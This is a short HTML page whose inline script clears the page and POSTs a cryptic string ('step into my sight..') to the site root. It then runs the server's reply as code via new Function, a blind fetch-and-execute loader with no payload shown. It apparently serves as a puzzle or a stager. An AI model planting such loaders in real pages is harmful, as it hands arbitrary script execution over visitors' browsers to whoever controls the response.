<!doctype html>
<html>

<head></head>

<body>
    <script>
        - function () {
            document.body.innerHTML = "";
            var xhr = new(window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    new Function(xhr.responseText).apply(window);
                }
            };
            xhr.open('POST', '/');
            xhr.send("step into my sight.."+Date.now());
        }();
    </script>
</body>

</html>
